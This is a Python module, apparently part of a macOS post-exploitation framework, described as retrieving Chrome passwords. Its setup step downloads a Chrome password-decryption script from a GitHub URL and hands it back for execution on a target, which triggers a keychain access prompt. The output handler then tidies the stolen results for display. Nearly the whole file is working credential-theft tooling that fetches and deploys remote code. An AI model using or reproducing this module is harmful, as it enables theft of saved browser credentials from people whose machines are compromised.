from modules.helpers import ModuleABC
import urllib.request


class Module(ModuleABC):
    def __init__(self):
        self.code = None

    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Retrieves Chrome passwords.",
            "References": [
                "https://github.com/manwhoami/OSXChromeDecrypt"
            ],
            "Task": False
        }

    def setup(self, module_input, view, successful):
        module_input.add("This will prompt the user to allow keychain access.", "attention")
        confirm = module_input.prompt("Are you sure you want to continue? [Y/n]: ").lower()

        if not confirm or confirm == "y":
            request_url = "https://raw.githubusercontent.com/manwhoami/OSXChromeDecrypt/master/chrome_passwords.py"
            request = urllib.request.Request(url=request_url)
            response = urllib.request.urlopen(request).read()

            self.code = response.decode()
            successful.put(True)
        else:
            view.output("Cancelled", "info")
            successful.put(False)

    def run(self):
        return self.code

    def process_response(self, response: bytes, view):
        # Remove the useless colors, thanks.
        view.output(response.decode()
                    .replace("\033[32m", "").replace("\033[35m", "")
                    .replace("\033[34m", "").replace("\033[1m", "")
                    .replace("\033[0m", "").replace("\\t", " " * 7))
